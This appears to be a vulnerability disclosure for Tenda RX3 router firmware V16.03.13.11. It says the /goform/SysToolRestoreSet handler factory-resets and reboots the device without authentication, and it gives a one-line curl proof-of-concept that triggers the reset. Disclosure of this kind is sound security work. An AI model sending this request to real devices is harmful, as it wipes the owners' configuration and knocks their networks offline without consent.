| Firmware Name | Firmware Version    | Download Link |
| ------------- | ------------------- | ------------- |
| RX3           | V16.03.13.11_multi  | https://static.tenda.com.cn/tdeweb/download/RX3/US_RX3V1.0br_V16.03.13.11_multi_TDE01.zip |

## Analysis

In the httpd binary, the function `fromSysToolRestoreSet` handles requests to `/goform/SysToolRestoreSet`. It calls `systool_sys_handle(1)` (factory reset) and `systool_sys_handle(0)` (reboot) without any authentication check or confirmation. A single HTTP request erases all device configuration and reboots to factory defaults.

![Ghidra showing systool_sys_handle calls](screenshots/1.png)

## POC

```
curl -i -X POST http://192.168.0.1/goform/SysToolRestoreSet
```

![PoC result](screenshots/2.png)
